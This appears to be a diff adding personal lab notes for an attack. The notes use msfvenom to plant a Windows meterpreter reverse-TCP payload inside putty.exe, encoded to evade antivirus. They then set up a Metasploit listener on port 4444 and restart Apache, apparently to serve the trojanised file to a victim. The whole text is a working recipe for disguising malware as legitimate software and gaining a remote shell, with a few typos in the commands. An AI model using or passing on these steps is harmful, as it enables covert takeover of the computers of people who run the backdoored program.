@@ -1,0 +1,12 @@
+mkdir iacsd
+
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=target ip lport=4444 -e x86/shikata_ga_nai -i -3 -b "\x00" -f exe -o puttyX.exe
+ 
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST IP OF KALI
+set LPORT 4444
+exploit
+sudo systemct restart apache2
+then go to  win ip of kali
